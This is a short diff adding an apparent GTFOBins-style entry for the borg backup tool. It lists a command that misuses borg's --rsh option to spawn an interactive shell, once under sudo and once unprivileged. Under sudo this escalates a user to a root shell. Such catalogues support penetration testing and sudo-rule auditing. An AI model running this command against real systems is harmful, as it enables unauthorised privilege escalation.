@@ -1,0 +1,11 @@
+borg
+====
+
+Shell
+-----
+
+[Sudo]
+    borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
+
+[Unprivileged]
+    borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
